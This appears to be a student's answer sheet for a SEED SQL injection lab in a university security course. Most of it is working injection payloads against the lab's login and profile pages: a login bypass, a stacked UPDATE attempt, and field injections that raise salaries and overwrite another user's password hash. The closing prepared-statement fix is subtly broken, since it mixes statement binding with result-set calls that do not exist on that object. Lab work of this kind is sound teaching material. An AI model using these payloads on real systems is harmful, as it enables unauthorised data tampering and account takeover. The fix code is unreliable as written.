## Lab 04
## Ben Holmgren
## benjamin.holmgren1@student.montana.edu
## CSCI 476
## Due 3/9/2021 (noon)


### Task 1
Running 'select * from credential;' we obtain the list of the users in the
database.
Running 'select * from credential where Name='alice';' we get the password of Alice alone.

### Task 2.1
admin'#

### Task 2.2
curl 'www.seedlabsqlinjection.com/unsafe_home.php?username=alice%27%23 > file.html

### Task 2.3

admin'; update credential set Salary=99999999 where name='Alice';#
Doesn't work!

### Task 3.1

running Alice', Salary='99999999999999

### Task 3.2
running Samy', Salary='1' where Name='samy';#

### Task 3.3

Run Samy', password=SHA1('alicepassword') where Name='samy';#

And, to verify, just type select(SHA1('alicepassword');



### Task 4

Code that worked:

```
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn 

                        FROM credential

                        WHERE name = ? and password = ? ");



// Bind parameters to the query

$stmt->bind_param("ss", $input_uname, $hashed_pwd);

$stmt->execute();

$stmt->bind_result($id, $name, $eid, $salary, $ssn);

$stmt->fetch();



if ($stmt->num_rows > 0) {

  // only take the first row 

  $firstrow = $stmt->fetch_assoc();

  $id     = $firstrow["id"];

  $name   = $firstrow["name"];

  $eid    = $firstrow["eid"];

  $salary = $firstrow["salary"];

  $ssn    = $firstrow["ssn"];

}

```

